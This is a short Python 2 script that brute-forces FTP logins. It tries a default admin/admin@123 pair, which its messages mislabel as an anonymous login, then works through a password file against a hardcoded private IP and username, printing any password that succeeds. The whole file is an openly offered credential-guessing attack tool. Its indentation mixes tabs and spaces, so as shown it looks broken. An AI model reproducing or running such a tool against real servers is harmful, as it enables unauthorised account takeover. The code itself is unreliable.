#!/usr/bin/python 

import ftplib


## main function which will handle the brute force process!!
def config(host,username,password):
                  try:
	             ftp =ftplib.FTP(host)
	             ftp.login(username,password)
	             ftp.quit()
	             return True
                  except:
                     return False 
	        
   

def main():
       
	   host = "192.168.43.224"
	   username = "ashish"
	   passFile ="password.txt"

	## check whether anonymous login enabled or not!

	   if config(host,"admin","admin@123"):
		    print "[+] Anonymous Login Successfull!" 
                    exit(0) 
	   else:
		    print "[+] Anonymous Login Failed!"
      ## if the anonymous login failes let brute force now!

           print "[+] BruteForce Started on: " + host 

      ## lets open our password file and read the passwords from it and bruteforce
           passwordsfile = open(passFile,'r')

           for password in passwordsfile.readlines():
    	                           password = password.strip('\r').strip('\n')
        
                                   if config(host,username,password):
        	                            print "[+] Brute Force Successfull: " + " username: " +  username + " Password: " +str(password)
                                            exit(0)
        	                           
                                   else:
        	                            print "[+] Brute Force Failed!" + " username: " +  username + " Password: " +str(password)

    
if __name__ == "__main__":
	main()

